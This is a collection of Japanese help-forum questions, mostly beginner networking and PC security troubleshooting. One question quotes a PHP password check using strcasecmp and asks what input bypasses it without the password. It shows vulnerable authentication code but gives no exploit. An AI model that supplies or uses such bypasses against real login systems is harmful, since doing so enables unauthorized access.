これをLANケーブルの抜き差しなしで確立する方法を教えていただきたいです。録画ビューワーソフトは無線LAN側のゲートウエイを強制的に読ませる方法がわかればと思っています。 よろしくお願いします。
php言語の脆弱性について パスワード認証において、phpのstrcmp, strcasecmpといった関数には脆弱性があると聞きます。 そこで、具体的にどのような脆弱性があるのかお伺いしたいと思います。 たとえば、認証画面にパスワードの送信フォームがあり、パスワードが分からない場合 $pass = **** if (isset($_POST['pass'])) if (strcasecmp($_POST['pass'], $pass) == 0) echo "Correct!"; else echo "Incorrect" というプログラムになっていた場合、送信フォームにどのような文字列を渡せば認証が通るのでしょうか。 また、認証が通る仕組みについても教えていただけたらと思います。
centos6.3をvpsサーバでいじっています。 nmap 103.xxx.xxx.xxx（自分のipアドレス） をすると、 PORT STATE SERVICE 22/tcp open ssh 25/tcp closed smtp 80/tcp open http 110/tcp open pop3 143/tcp open imap と出ます。 25番ポートがどこかで閉じているのか それとも、postfixがきちんと動作していないのか 切り分けできません。 ちなみにiptablesは -A INPUT -p tcp -m tcp --dport smtp -j ACCEPT としていて、 nmap localhostでは 22/tcp open ssh 25/tcp open smtp 80/tcp open http 110/tcp open pop3 111/tcp open rpcbind 143/tcp open imap 993/tcp open imaps 995/tcp open pop3s と出ます。 原因の切り分けができずに困っています。 宜しくお願い致します。
スパイウェアを検出しました！という表示が点滅して表示されます。（添付データ参照）とてもサイトが醜く勉強にもなりません。 削除する方法はありませんか？よろしくお願いいたします。 ちなみに現在はGoogleChromeで表示させています。InternetExplorerでは表示されませんが今は危ないということで使用していません。 OSはWindows7です。よろしくお願いいたします。
今回騒がれているものについてですが、 個人レベルで使用した場合、危険度は実際どの程度なのでしょうか？（windows7、IE8） セキュリティ系に詳しい方お願いします！
実は、昨日とても恐いメールが彼から届きました。 私はkik メッセンジャーというアプリを利用しており、彼ともkikで、やりとりをしています。 彼、「ごめんね、君の、kik内を調べさせてもらったんだけど、知らない男達とメールのやりとりしてるね。」との 内容でした。内容も、具体的で、何月何日にという感じ。 彼とは離れて暮らしているのでiphoneを直接みられたのではないので、一体どうやって？疑問です。遠隔操作で、他人のアプリ内のメールを探る事は可能なのだと、恐くなりました。で、なにか 対策がありましたら教えてください。 ちなみにkikは、LINEの様なものです。
LANだと、数台のPCが同じサッブネットにある場合、ネットワーク設定により、フォルダー共有ができます。 Wifiの場合、同じSSIDでのノットPCが、LANのようなファイル共有ができますか？ 別件：上記のようなファイル共有ができるだとすると、無線ランのルータのインタネット回線が差し込んでいない、電源だけONの場合、各同じSSIDでのノットPCが、ファイル共有ができますか？ 素人の質問ですが。
IEのセキュリティが問題が報道されましたが、会社ではプロキシサーバーと言った代理サーバーさら接続してると聞いてます。 その場合も、自分のパソコンが乗っ取られたりする事はあるのでしょうか？ 少し詳しく教えていただけると助かります。
グーグルクロームは検索履歴が思わぬところに残っていて恥ずかしい思いをしそうなので 使うのが怖いです。 （パソコン内に残る。・・・会社のものではないのでサーバー関係なし。プロバイダに履歴ログが残るのは大丈夫でしょう。） CTRL　SHIFT　N　でシークレットモードというものがあるようですが、 これをデフォルトにできないのでしょうか？ パソコンに工口サイト検索の記録が残っていると家人に見られそうで恐怖です。 スマホ貸したら変なワードがでしょうでドキッとしました。 グーグルにログインしないようにしているつもりですがいつのまにかログインしているようです。 こっそり楽しみたいのですが。 こっそり楽しむことが悪いのでしょうか？ やましいことはできないということ？
多摩ケーブルネットワーク（TCN）というプロバイダーに契約していて、光回線なんですが 速度が2mbps未満しか出ないです。以前フレッツ光のUSENスピードテストで ドラゴン級の一つ前のスピードが出ていて快適だったんですが、最近遅いなと感じ、 テストしてみたら2mbpsしか出ていませんでした...光回線でルーターも100mbpsまで 対応しているのは確かです。なにが原因で遅くなっているのでしょうか... PCとルーターとモデムのスペックです↓ [PC] OS：windows7 Home Premium プロセッサ：Intel(R)Core(TM)i7-3770 CPU @ 3.40ghz 3.40ghz RAM：8.00GB(7.89GB使用可能) システムの種類：(64ビット オペレーティングシステム) [モデム] DOCSIS2.0準拠ケーブルモデム BCX280J2 下り最大43Mbps、上り最大30Mbps 周波数帯域 送信 5MHz～55MHz 受信 90MHz～860MHz [ルーター] Buffalo WZR-600DHP3
パソコン初心者です。FFFTPをインストールして、開いたらopenSSLを読み込まれました。と表示がありました。これってヤバイですか？
本社VPNルータ(LAN側IP192.168.0.1　設定変更不可)で構成されているネットワークに、 RTX810ルータ(LAN側IP192.168.0.100)をLAN側に接続し、WAN側には172.100.100.100を 割り当てた構成 と仮定した場合下記の動作は可能でしょうか。 インターネット 　　　　｜　　　　　　　RTX810 ルータ192.168.0.1　ルータ172.100.100.100――ルータ172.100.100.1 　　　　｜　　｜　　　　　　　192.168.0.100　　　 　　　 ｜ 　　　　｜　　｜　　　　　　　　 　　　　｜ 　　　　　　　 WEBサーバ 　　　　｜ 　 　 ――――――――― 　　　 PC WEBサーバへの接続(172.100.100.50)をしたい場合、 pcよりhttp://192.168.0.100にアクセス、 RTX810の割当てIP(LAN側IP192.168.0.100)のパケットはすべて NATを利用し172.100.100.100系ルータ経由で接続可能でしょうか?。 ※RTX810のデフォルトゲートウェイは192.168.0.1 ※WAN側からのアクセスは無し ※端末設定 固定IP 端末数が多い為変更が難しい。 　　192.168.0.XXX デフォゲ　192.168.0.1 　　DNS 192.168.0.1 以上よろしくお願い申し上げます。
社内でWindows2008R2サーバを使用しています。 各サーバはプライベートIPで運用しております。 ＜NW構成＞ グローバルIP（インターネット接続） 　| FW（NAT） 　| プライベートIP（Windowsサーバ） 　192.168.xx.xxx サーバのWindowsUpdateが実行しており、 その結果適用すべきパッチのリストも増えています。 「プライベートIPで使用しているから」、という理由で パッチを適用しないのは間違っておりますでしょうか？。 本来であればパッチを１個１個洗い出し、 緊急性を洗い出してから適用を判断すべきですが、 弊社は小規模のため、業務と掛け持ちでメンテをしています。 そのため、今までは自動適用（Windowsが自動でダウンロードし適用）でした。 これも「サーバ」という役割を考えると、リスクは高い設定でしょうか？。 以上2点、ご意見を頂けると助かります。
質問がありますっ!! Yumi★です(*^^*) ipod touchで、電話できるとききました!! 電話をすると、通話料がかかり、携帯電話みたいに請求?お金をはらわなければいけないのでしょうか? ごめんなさい(>_<) 私、よくわかんなくて... おねがいします!!教えてください★
こんにちは(*^^*) Yumi★です!! 私は、ipod touch が欲しいです。 その事について質問があります。お願いします(>_<) 1★ ipod toch は、子供だけでかえるのでしょうか? 未成年でも... 2★ 買えるとしたら、住所とか、家の電話番号等を登録しなければいけなのでしょうか? 3★ 携帯みたいに、月何円というお金の請求はあるのでしょうか? すいません...おねがいします!! 私わからなことばかりで... お願いします!!
IPとはなんですか？？？ どうゆうのがIPかわからなくて・・・ どうか親切なかた明確に教えてくれたらうれしいです！！
PCにNICを2枚挿しして、一方は社内LANに接続してファイル共有やインターネットアクセス、他方にはルータを接続して、不特定の端末からそのPCに特定プログラムでデータの授受のみ行うネットワーク構成を検討しています。 　・概要図 　　　社内LAN -- <<PC>> -- ルータ -- 不特定の端末 　　　　　　　　　　　　　 共有フォルダ etc セキュリティ上、ルーター経由の端末からは、PC上の共有フォルダや、社内LAN上の他端末の存在を知られたくない(特定のプロトコルのみPCと通信する)ようにしたいのですが、PCのWindowsファイアウォールの設定を変更することで実現で可能でしょうか？ WindowsXPではファイアウォール設定でNIC毎にファイルとプリンタ共有のON/OFF等を設定(特定プログラムを例外登録)すれば実現できそうなんですが、Windows7ではNIC毎の設定というのが無くて困っています。
PINGに応答するメリットと、デメリットを教えてください。
よろしくお願いします。 サーバーやメール送信に関して、詳しい知識が無いので、的外れな言葉を使っているかも知れませんが、ご容赦ください。 　 独自ドメイン発信のメールが迷惑メールや　なりすましと判断されないための措置に関してです。 一般的には、発信元のドメインのDNSのSPFレコードに発信元のIPなどを記すそうですが、 それは、実際に発信するサーバーと、メールのFromアドレスに設定されているサーバーが同じ場合という前提だと思います。 例えば、メールサーバーが稼働しているドメイン(A)とは別の外部のサーバー(B)から、PHPプログラムのsend_mailなどでメールを送信し、そのメールのFromアドレスのドメインは(A)にしたい場合などあると思います。 その環境にも対応する設定なども可能なのでしょうか？ また、その設定をするDNSとは、(A)のサーバーの中にあるのでしょうか？？ かなり知識レベルが危ういというのは自覚しておりますが、 分かる方、是非、教えていただけないでしょうか。 よろしくお願いします。
暗号化されているデータを総当り攻撃で解くとします。 256ビット長の鍵についての総当り攻撃が消費電力100wのコンピュータで1秒で解けるとする。 このとき、2段階の暗号化したものを総当りで解くには、 １００W*1秒　＋　１００W*１秒＊２＾２５６　＞　１．１５＊１０＾７７Ws このとき、３段階の暗号化したものを総当りで解くには、 １００W*1秒　＋　１００W*１秒＊２＾２５６　＋　１００W＊1秒＊２＾５１２　＞　１．３４＊１０＾１５４Wｓ 世界の発電量は ２０２８２１５５　(100万ｋWh)　＝　７．３＊１０＾１９　Ws　くらいなので、 3段階の多重暗号化をしておけば、消費電力の面から見て安全であるといえますか？
ご質問を致します。 社内LANで繋がっており、 サーバー上にＥＸＣＥＬやACCESSなどのファイルが格納されています。 当方の端末だけ ＥＸＣＥＬなどのファイルの動きがとても遅くて困っています。 状況は以下の通りです。 １．当方の端末にあるファイルは問題なく動く ２．サーバー上のファイルを操作しようとすると異常に遅い ３．隣の席の人は、サーバー上のファイルも問題なく動く 　　（当方の端末が動いていても） ４．隣の席の人の端末の電源を切ると、 　　当方の端末からサーバー上のファイルも問題なく動く ５．隣の席の人の端末はWIN8 　　当方の端末はWIN7 ６．４月に席を移動したのですが 　　移動する前は問題なく動いていた。 　　（隣の席の人は、移動前も移動後も同じ） このような状況なのですが どなたかご教示頂けると助かります。
話の前提として、パスワードや秘密の答えやメアドローカルパートなど 何でもランダムな文字にしています。 本日、拡張ASCII印字文字なるものが存在することを生まれて初めて知ったのですが http://office.microsoft.com/ja-jp/excel-help/HA0 … これらの文字は、パスワードや、秘密の質問の答えや、その他、 実際、どれくらい使えるものなのでしょうか。 最近、拡張でないASCII印字文字のうち、記号の部分の文字を、 フリーメールの、秘密の質問の答えに、何文字か含めて設定して、 設定後に、実際使えるかどうかを試してみたら何度やってもハネられて、 しかも、秘密の質問や答えの設定の画面でも、 以前の質問と答えを正しく入れないと 変更できない（ので、もしバレたらどうにもならない）という目に遭いました。 そのフリメは、秘密の答えに使える文字種はどれといった説明はどこにもなく、 答え設定時は何の問題もなく通りました。 ちなみに海外のサイトで、日本語表示はありません。(日本語メール読み書き送受信はできます) もうこのフリメアドは捨てるしか無いと思いますが、 こういう災難に遭う前に、確認しておきたくて質問しました。 現状に詳しい方いましたらご教示の程、よろしくお願いします。
インターネット経由で、ある1カ所の拠点向けにWebサービスを提供しているシステムの運用をしているものです。 ファイアウォールを設置しておりますが、IDS・IPSは導入しておりません。 このシステムでは、1拠点にしかサービスを提供していないので、その拠点からのアクセス以外は全てファイアウォールでドロップしております。 上司から、ファイアウォールのログの監視の運用を確立するように指示がありました。 下記の案を考えてみたのですが、どんな物を検知・集計するのが有効なのか、世間一般にはどんな方法があるのかを知りません。どなたかお知恵をください。 ・一定時間内に同一ソースからのアクセスを大量にドロップしたものをリアルタイムに検知する。 ・定期的(週1回など)同一ソースからのアクセスの集計する。
モデムの電源が間違って切れ、ネットに繋がらなくなりました。 モデムとルーターの電源を切り、もう一度電源を入れる操作をして、 インターネットに繋がったのですが、 その後またモデムの電源を間違って切ってしまいました。 同じ操作をすればつながるとおもったのですが、繋がりません。 同じ日に２度も電源が切れると繋がらなくなるのでしょうか？
ネットワーク上の共有フォルダへのログインダイアログの違いがなぜ発生するのか教えてください。 クライアントはWindows7です。 同一サーバー上の共有フォルダにアクセスすると、Windowsセキュリティのパスワードの入力ダイアログが表示されますが、一つのフォルダは、ユーザー名、パスワードの両方を入力し、もう一つのフォルダは、ユーザー名は自動表示され、パスワードのみ入力すれば、ログインできます。 同じユーザ名パスワードでフォルダの中に入れますが、順序によって、一つのフォルダに入れません。 ユーザー名とパスワードの入力を求めるフォルダにログインしてから、 ユーザー名は自動表示、パスワードのみ入力する方の、もう片方のフォルダにアクセスすると、「～複数のユーザー名での複数の接続は許可されません。サーバーまたは共有リソースへの以前の接続をすべて切断してから、再試行してください。」と接続がエラーになります。 逆に、ユーザー名が自動表示されている方のフォルダからログインすると、問題ありません。 自動表示時のユーザー名は、[サーバー名]\[ユーザー名]と表示されます。 ユーザー名も入力必要な方は、[ユーザー名]のみでログイン可能です。 お客様環境のため、管理者権限などなく、サーバー側のOSやネットワークの設定がわからず、詳細をお伝えできず申し訳ございませんが、クライアント側で確認できるようなことがあれば教えてください。ちなみに、資格情報には何も書かれていないのを確認済です。
この手の質問が数多くあり、ネット上でも調べればかなりの情報が出てきますが、半日調べてもわからなかったので質問させてください。 私はあまりパソコンについて詳しくなく、いつもその場で調べてなんとかしてきたので、専門知識とか先立つものがなくて、いわゆる知識に関しては初心者です。変な質問内容になっていたり意味不明なことを書いてしまっていたらすいません。 まず、今まで居間にあるデスクトップのXPを使っていました。今回買い換えて、2階の自室でやっています。 たまに友達とゲーム配信などをしていて、WMEで配信していました。 新しいパソコンでやったところ、OSなど変わった部分を設定しなおしても、ポートだけ開放できていませんでした。 XPのときは開放手順などふまずにいつでもできていたので、手動で開放することにしたのですが。 前に使っていたポート番号8080でやってみて、できず。調べてFWの設定から許可しました。 個別にポート番号指定で調べたとおりにやったので、できていると思います・・・。 それでも配信に繋がらず、サイトで調べてもポートが開放できていなかったので、UpnPcjを使いました。 UpnPcjには、ネット対戦でホストをするときにお世話になっていて、ポート番号を指定して開放しました。 その結果、UDPは開放できているのですが、TCPの方がFWまたはルーターによってブロックされているとわかりました。 別のツールでも、TCPが開放できていなかったので、これが原因なんだろうとは思うのですが、ここからどうしていいのか全然わかりません。 もしかして、8080のポートがダメなのかと思い、空いているポート番号(いくつかやりましたが、例として28800で)で同じようにFWで個別指定で開放し、UpnPcjでも開放しましたが、できていませんでした。 UpnPcjで、28800でUDPで開放した時は [既存cgiリストを利用します] (3) UPnPでポート 28800 (UDP)を開きます →AddPortMapping 成功 (4) ポート 28800 を(UDP)listenします →listen OK (5)外部接続を試みます [SP.Thanks]PHPが使える無料HP @page[!] →外部接続 OK ------------------------------------------------------- ○テストに成功しました と表示され、TCPで外部接続をテストすると、 [既存cgiリストを利用します] (1) ポート 28800 を(TCP)listenします →listen OK (2)内部接続を試みます →内部接続 OK (3) UPnPでポート 28800 (TCP)を開きます →AddPortMapping 成功 (4) ポート 28800 を(TCP)listenします →listen OK (5)外部接続を試みます [SP.Thanks]PHPが使える無料HP @page[!] →no accept timeout(外部接続に失敗しました) 【可能性１】FWがブロックしている 【可能性２】ルーターのFWがブロックしている 【可能性３】IPv6環境または、グローバルIPではない（ポート開放不可） ------------------------------------------------------- ×テストに失敗しました と表示さてます。可能性１～３を見て、それが原因なのかとは思うのですが、どうしていいかわからないんです。 多分TCPの方が開放できれば大丈夫なのかな、とは思うのですが、知識がなく、多少知識のある友達も、それで開放できないなら他の人に頼るしかない、といわれたので質問させていただきました。 ちなみにルーターは前のＰＣがおいてあった場所においてあるので1階にあります。 今のＷｉｎ７はノートパソコンなので、ルーターに直接つないでいないとポート開放できないとかそういうことだったら厳しいですが・・・。 どなたか知恵をお借りできないでしょうか、まったく手に負えないです。よろしくお願いします。 もし情報が足りてない、とかありましたら本当に申し訳ないです。 今までできていたことがどうやってもできなので、かなり混乱しています。
初心者で失礼致します。 先日、「拠点間では通信ができるが、インターネット接続ができない（外に出れない？）」という事象を耳にしました。 考えられる原因として、知り合いの方から「恐らくVPNセッションが脹れていない。VPNが壊れたんじゃないか？」といった事を伺いました。 素人イメージですと、VPNセッションが脹れていないのであれば、むしろ拠点間通信にこそ 影響があるのではないか？と考えてしまいます。 私のVPNセッションの考え方が大きく誤っておりますでしょうか？ 色々検索してみましたが、満足のいく回答が見当たりませんでした。 VPNセッションが脹れない、とはどういう事で、それはどういう影響をおよぼすのか 教えていただけますと幸いです
ゆうちょダイレクトにログインする為に　Ｐｈｉｓｈｗａｌｌをインストールしなければログインできなくなってしまったので　Ｐｈｉｓｈｗａｌｌをインストールしましたが未だにログインができません。　　Ｐｈｉｓｈｗａｌｌサポートセンターにお問い合わせしたところ下記のメールが返信されてきました。 ーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーー ご確認いただきました内容と、弊社での検証結果より、 ご利用のセキュリティソフトやセキュリティツールバーが PhishWallの動作や通信に影響を与えている可能性がございます。 誠にお手数ですが、ご利用中のセキュリティソフト、および、 セキュリティツールバーでPhishWallの動作を許可するよう 設定いただけませんでしょうか。 ※セキュリティソフトの操作方法がご不明な場合は、 　誠にお手数ですが、ソフトウェアご提供元様の 　専用窓口までお問い合わせをお願いいたします。 ーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーー とのことなのでウィルスソフトはAvira free Antivirsを使っていますがこちらのサポートセンターはＦｒｅｅは対象ではありません。　ここのＷＥＢから質問集などがあり質問しようと思って何度も登録を心みたのですが　登録できず質問すらできない状況です。 PhishWallの動作を許可をするには何か設定がＷＥＢ上でできるのでしょうか？？ 仕事でゆうちょダイレクトを使っているのでログインできずに仕事が全く進まない状態です！ 教えて下さい。 Avira　Ｆｒｅｅ使用している方は皆ゆうちょダイレクトにログインできないのでしょうか・・・そうしたら大問題だと思いますが・・・・・　一緒に仕事している上海在住の日本人はPhishWallをインストールしなくてもゆうちょダイレクトにログインできたと言ってましたが。。。　とにかくログインをしないと仕事が進まないのでどなたか　教えて下さい！！（ＴＯＴ）
少しわからない点が。。このサイトは最近利用しております。実はビスターVGC-LM71Bの型番でお尋ねし対と思いますが。今パソコンのプログラムといえばいいのか？修復する為にアップデートでパソコンを利用するときにスタートボタンからインターネットエクスプローラーにポインター合わせるとホームが開けますが、今の段階では開きません。 そのときの開かないときのアドレスはhttp://go.microsohoft.com./fwlink/?linkld=76277 というアドレスが表示しています。これは専門家に尋ねるとこれを正常に戻すには アップデートで最初からのサービスパックをダウンロードして毎回繰り返し正常な状態に戻す方法があるのでダウンロードし続けるといいます。私は一応言われたとおり１００回以上ダウンロードしました。ただ通常は再起動しますが私の場合自分で再起動させないとだめなのかなっと思い毎回再起動自ら行っています。しかしサービスパックは一向にサービスパック２は出現しません。何かやり方間違っているのでしょうか？接続はしています。が本来の通常モードではないことは明らかですから。 私は初期化したのでそれがいけなかったのです。リカバリーもしてなかったしこのパソコンはもともとリカバリーデスクはありませんです。自ら保存してCDに収めておくべきものだったようです。知りませんでした。 専門家もこのような現象は経験したといいます。いまのところ私の場合コントロールパネルからシステム の中のアップデートクリックしダウンロードしてインストールします。インストール成功しましたというメッセージがでたら自分で再起動をかけます。しかしパソコンが立ち上がっても現状は少ししか変わりません。デスクトップ画面が写真が出ただけです。それ以外の状態はあまりわかりません。アドレスはそのままです。だから今は別のブラウザを利用しネットを開くしかないのでそうしています。いきなりサービスパック２をダウンロードしたとしても現状が変わらない限り無理なのでしょうか？ パソコン工房に昨日で向いたときはちゃんと聞いていたはずなのにいざやり出したら同じサービスパック１ばかりが１００以上更新経緯が並んでいるだけのような？何かほかになすべきことがあったのでしょうか？またパソコン工房に出向くのも疲れてしまって。前回は金額はかかりませんでした。 たいした問題ではないとのことでしたから。でもいつまでたっても更新が進展しないのは？ 初期化したために私の使っているパソコンが修復できなくなったため修復させなくてはならなくなったのだといわれました。これは初期化してもだめかもということなので？専門家の方がいらっしゃれば この状態理解してくだされば幸いです。足りないところをサポートして頂けないでしょうか？添付ファイルは今はやり方詳しくないので後ほど必要あればというよりこのパソコンはまだそういう機能を利用する段階にはないと思って・・・・・・・。今はその問題パソコンで質問コーナーに入っております。サービスパック１ではサポートが終わってしまい修復出来ないようなので、よろしくお願いします。
コレガのルーターがインターネットに繋がらない
Wimax（MobileSlim）を購入したので、数年ほど使っていなかったLANコンバータを接続しようと、192.168.1.100で設定しましたが、設定中に突然切断してしまいます。電源入れなおしても現象は変わりません。古い製品ですので、もう寿命でしょうか？同じ製品お持ちの方いらっしゃいましたら、どうかご教授願います。
XPのサポートが切れ、セキュリティの関心が高まっていますが、疑問があります。 Windows2000やXPなど、セキュリティソフトを入れず無防備な状態でネットにつなぐだけで ウィルスに感染するのでしょうか？ ネットにつなげたことを誰かが感知して、攻撃してくるのでしょうか？ どうやって感知して、どうやって攻撃してくるのか謎です。 怪しいサイトに自分からアクセスすれば感染するのは理解できます。 しかし、ネットをつなげて、ブラウザなど起動しなければ大丈夫ではないのでしょうか？ よろしくお願いします。 ・ネットにつないで１分でウィルスに感染した動画 http://www.nicovideo.jp/watch/sm8969919 ・何十億というパソコンがインターネットにつながっているのに、なぜ分かるのか。。 私でも、誰かのパソコンにアクセスできるのでしょうか？（法律で禁止されていることを考えず）
auひかりマンションタイプで契約しています。 私はネットワークに関する知識が疎く、手探りで行っている初心者です。 以下の目的に記載している項目に興味があり自宅環境を整えたいと思っております。 色々調べてみるも理解不足もあり、なかなか上手くいけずご教授お願いします。 ■使用ルータ 　レンタルモデム＆ルータ：Aterm BL172HV　・・・・・　以下ルータＡ 　　（ルータＡは無線オプション契約していません） 　ルータ（無線・VPN用）：WHR-G301N　・・・・・　以下ルータＢ ■接続機器 設置場所やポート数から以下のように考えております（【】内はプライベートIPの割り振り方法です）。 ルータA（LANポート数：5、DHCP：ON） 　(1)【固 定】　nasne(増設の可能性あり) 　(2)【DHCP】　自宅用PC（複数） 　(3)【DHCP】　（設置予定）ＩＰ電話 　(4)【固 定】　（設置予定）自宅サーバ用ＰＣ 　　（(1)、(2)によりポート不足の場合はHUBを購入予定） ルータB（LANポート数：4、DHCP：ON） 　(5)【固 定】　テレビ（BRAVIA） 　(6)【DHCP】　PS4・PS3等のネットワーク対応ゲーム 　(7)【DHCP】　携帯機器（android端末、PSvita等）　・・・　Wi-fi接続 ■現状 　　[インターネット]---[モデム・ルータＡ]---[ルータＢ(ブリッジ)]で接続し、 　ルータＡのDHCPをonで、空いてるLANポートに接続機器等をつないでいます。 ■目的 　(1)　IP電話の設置予定 　(2)　BRAVIAとnasneをDLNA接続 　(3)　I・O DATAのNASを外部から利用（リモートリンク2を使用） 　(4)　PS4のリモートプレイを外部（PSVita）から利用 　(5)　外部からのWOL・VNCを利用 　(6)　HTML・FTP等の自宅鯖PCを追加予定 　(7)　VPNの構築（ルータＢのPPTPサーバを利用して外部からnasneを閲覧したい） IP電話を利用しつつルータＢのVPNを利用するにはルータＡとＢの ２重ルータ環境であれば可能だと思い以下を参考に設定しました。 http://d.hatena.ne.jp/yoneh/20090304/1236156839 ルータＡにnasne、ルータBにテレビやPSVitaを接続しており、それらの機器からnasneを参照できませんでした。 これは第3セグメントが異なり、サブネットマスクを255.255.255.0で設定しているため、ルータAとルータBのグループが別のネットワークとして働いているということでしょうか？ http://mbsupport.dip.jp/bk/2003/sub/916.htm この場合、DHCPサーバ及びIPを固定している機器のサブネットマスクを255.255.0.0に設定すれば良いという事でしょうか？ または、ルータAとルータBの第１～３セグメントを同じにして同一グループに設定可能ですか？ まだ上記設定においてVPNの構築や外部からのWOL・VNC接続などの設定ですが、 ルータの設定を以下のようにするという理解で合っていますでしょうか？ （URLは設定の参考にしたサイトのアドレスです） ◆ポートマッピングの設定（ルータA） ◇VPNの設定 　・・・　LAN側IPにルータBのIP、TCPプロトコルの1723番ポートとその他（47番プロトコル）を設定 　http://tenkitablog.blog110.fc2.com/blog-entry-35 … ◇WOLの設定 　・・・　LAN側IPに192.168.0.255、UDPプロトコルの2304番ポートを設定 　（ルータBに接続されている機器にディレクテッド・ブロードキャストする場合は192.168.255.255を設定） 　http://halyou.blog84.fc2.com/blog-entry-985.html 　http://blog.livedoor.jp/kame_551/archives/520371 … 　http://www.itbook.info/study/p60.html ◇自宅鯖の設定 　・・・　LAN側IPに鯖PCのIP、HTTP/FTP用にTCPプロトコルの80/20-21番ポートを設定 ◆LAN側IPアドレスの設定（ルータA・B） ◇ルータA（192.168.0.1） 　固定（最大）：18台（192.168.0.2～192.168.0.19） 　DHCP：192.168.0.20から236台（192.168.0.20～192.168.0.255） ◇ルータB（192.168.1.1） 　固定（最大）：18台（192.168.1.2～192.168.1.19） 　DHCP：192.168.1.20から236台（192.168.1.20～192.168.1.255） 目的(7)のためのVPN関係の設定・接続方法が理解できておりません。 上記ポートマッピングを行ったうえで外部からどのように接続・設定を行えばいいのでしょうか？ そもそもルータBのPPTPサーバを利用するのにルータ機能をONにする必要がある解釈が間違いで、 ルータAに上記ポートマッピングの設定を行い、ルータBはブリッジ接続でも良いのでしょうか？ 知識不足につきうまくまとめきれず、長文乱文失礼しました。
451 RETR denied: quota exceeded: used 1.23 of 0.95 transfer Mb というエラーです。 内容と対処お願いします。
いろいろ調べてみたのですが、やはりよくわからず、教えてください。 XPのPCでLANは繋げずオフラインでエクセルにデータの作成をしています。 このエクセルをUSBを使い、別のPC（Win７、セキュリティーソフト導入済）に移動させ エクセルのデータを印刷しています。 この方法をサポート終了後も続けたら、やはりUSBからウィルス感染する可能性があるのでしょうか？
Windows XP使用し続けると、銀行口座残高が抜き取られるなどが言われておりますが、これは、ＸＰサポート終了以降に、オンライン口座のサイトにパスワード入力してログインしたり、通販でオンライン決済などをしたりした場合に、初めて生ずる危険なのでしょうか。 または、パスワード情報をドキュメントとしてPCに保存していた場合に遠隔操作されたりなどして盗み見られたりして使用される場合があるということなのでしょうか。 また、たとえＸＰサポート終了以降にオンライン口座やオンライン決済をしなくても、ＸＰサポート終了以前にも使用したことがある場合、ブラウザによって、キャッシュだか、クッキーだかがパスワード情報が残っていることがあり危険なのでしょうか。 逆を言えば、ブラウザにパスワード情報残っておらず、また、XPでオンライン口座ログインやオンライン決済もせず、PC内にパスワードを文書保存していなければ、とりあえず銀行口座残高が抜き取られるなどの事態は起こり得ないのでしょうか。 とりあえず、４月９日以降、外部とのネットを遮断してＰＣをオフライン状態にしておけば安心なのでしょうか。
ノートパソコンＳＯＮＹのＶＡＩＯ「SVE15127CJP（ＯＳ：Windows8搭載）」を使用しております。 ※本体裏面にはMODEL「ＳＶＥ１５１Ｂ１１Ｎ」 Product Name「SVE15127CJP」 となっています。 このままだと、書面を印刷したくてもいちいちUSBに一度保存して、プリンタとつながっているPCに移して印刷しなければならず、面倒です。 ですので今プリンタとつながっているＤＥＬＬ「ＤＩＭＥＮＳＩＯＮ　３１００Ｃ（ＯＳ：WindowsＸＰ搭載）」と、そのVAIOをネットワークをつなげたいのですが、具体的にどのような手順を踏めばよろしいのでしょうか。
分かりにくいかと思いますが… パソコンAでGmailなどにログインし作業終了後ログアウトを行っているのですが 他のパソコンからGmailを開くとIDやパスワードを入力せずにパソコンAでログインしたアカウントがログイン状態になっているのですがどういうことが考えられますでしょうか。 （業務上Gmailなどを同時間に複数のパソコンで使用することがありますが関係ありますでしょうか。） 【接続情報】 BUFFALO LSW3-GT-16NSR 16ポートのハブ ルータはNTTのW200(192.168.24.1) Windows7を11台接続、IPアドレスも固定にしています。 よろしくお願いいたします。
現在使っているPCは、NECのノートパソコンです。docomoのルーターでネット接続しています。 TVはHDMI対応のものなのですが、ノートパソコンの方にはHDMIがないです。 HDMIケーブルを買ってしまったのでどうにかして繋ぎたいのですが、何を用意したらいいのでしょうか？ 説明が分かりにくく、すみません。パソコン初心者で全く分からないので、どなたか分かる方がいたらお願いします。
クラウドサービスで、データを預かりますというようなサービスがいろいろありますが、 強力な暗号機能を持っているサービスはどのサービスでしょうか？ ユーザーが簡単に暗号方式を決定できて、何度暗号化するかもユーザーが決定できる。 この設定に従ってデータは自動的に暗号化されてから、サービス提供者のサーバーに移動する。 自分のPCに戻ってきたら自動的に復号化される。 このような機能を持っているクラウドサービスを探しています。 お勧めはありますでしょうか？ よろしくお願いいたします。
softonicという物をダウンロード（インストール？）したのですが、怪しいものだと後で分かりアンインストールを試みたのですが、いくらさがしてもそういうプログラムがありませんでした。 そもそもsoftonicとは何なのでしょうか？ このままにしておいたら危ないでしょうか？ パソコンは初心者で他の質問サイトを見てもよく分かりませんでした。 ご回答宜しくお願いします。
ネットワーク未接続のiPhoneを、ネットにつながっているPCから テザリングしてiPhoneもネットワークに繋げた場合、 ネットワークの基地局はiPhoneの個体識別番号も記録するのでしょうか？
よく注意書きに別アカウントは他人にバレませんとか書いてあるけど、パソ通ならカンタン？に見破ってしまうんじゃないかと思うんですが？ どうなんですか？ 100%他人にはわからないってなんか信用できないです。
グローバルアドレスを持つDMZにある公開Webサーバ（http,https）へ外からアクセスする場合、ルータの（ACL）フィルタリング設定は以下でよろしいでしょうか？ また、内から外への通信は特に必要ないので全てブロックしても問題ないでしょうか？固定グローバル契約をしているのでDNS等他に通す必要があるんでしょうか？ ◆外⇒内 1.ルータのWAN側で、httpとhttpsをのみinで通す。 2.ルータのWAN側で、inで全てブロック。 ◆内⇒外 1.ルータのWAN側で、outで全てブロック。
前略 　いくつかウィルスがあるようなのです。 添付ファイル。 cltmng.exe dill32 とかいうのはタスクマネージャで起動するたびに 終了しています。 それ以外のウィルスもあるのかどうか。 よく知らないのです。 どなたか詳しい方、画像を見て。 これはウィルスというのがあれば教えてください。 よろしくお願いします。
windows vistaです フレッツ光簡単セットアップツールで、インターネットの接続設定をしていると、 ご利用の環境では本ツールを実行できませんというエラーになります (エラー番号:T33-025-001 環境コード:32-1-0-00-00-33) 線は抜けてないですしコンセントもしっかりつないでいます。 どうすればよいのでしょうか・・・
